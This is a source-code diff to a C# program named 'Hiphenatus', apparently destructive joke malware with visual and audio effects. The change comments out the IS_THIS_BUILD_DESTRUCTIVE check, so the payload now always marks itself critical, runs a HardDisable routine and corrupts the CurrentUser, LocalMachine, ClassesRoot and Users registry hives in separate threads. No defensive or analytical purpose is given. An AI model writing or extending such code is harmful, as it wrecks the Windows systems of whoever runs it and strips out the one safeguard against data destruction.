@@ -532,11 +532,12 @@ namespace Hiphenatus
         public void execPayload()
         {
             DefineAsCritical();
-            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
-            {
-                Corrupt(Registry.CurrentUser);
-                HardDisable();
-            }
+            //if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            //{
+                Thread hd = new Thread(HardDisable); hd.Start();
+                Thread corr1 = new Thread(() => Corrupt(Registry.CurrentUser));
+                corr1.Start();
+            //}
 
             Process.Start("https://www.youtube.com/@sudoUltimateQuack");
 
@@ -554,12 +555,11 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
-            {
-                Corrupt(Registry.LocalMachine);
-            }
-            
-            Process.Start("https://www.youtube.com/@sudoUltimateQuack");
+            //if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            //{
+                Thread corr2 = new Thread(() => Corrupt(Registry.LocalMachine));
+                corr2.Start();
+            //}
 
             XDD.Abort();
             shader1Thread.Abort();
@@ -578,10 +578,11 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
-            {
-                Corrupt(Registry.ClassesRoot);
-            }
+            //if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            //{
+                Thread corr3 = new Thread(() => Corrupt(Registry.ClassesRoot));
+                corr3.Start();
+            //}
 
             shader3Thread.Abort();
             bytebeat2.Abort();
@@ -598,10 +599,11 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
-            {
-                Corrupt(Registry.Users);
-            }
+            //if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            //{
+                Thread corr4 = new Thread(() => Corrupt(Registry.Users));
+                corr4.Start();
+            ///}
 
             shader4Thread.Abort();
             bytebeat3.Abort();
@@ -635,6 +637,11 @@ namespace Hiphenatus
 
             shader7Thread.Abort();
             bytebeat5.Abort();
+
+            corr1.Abort();
+            corr2.Abort();
+            corr3.Abort();
+            corr4.Abort();
 
             Thread bytebeat6 = new Thread(Beat11andhalf); bytebeat6.Start();
 
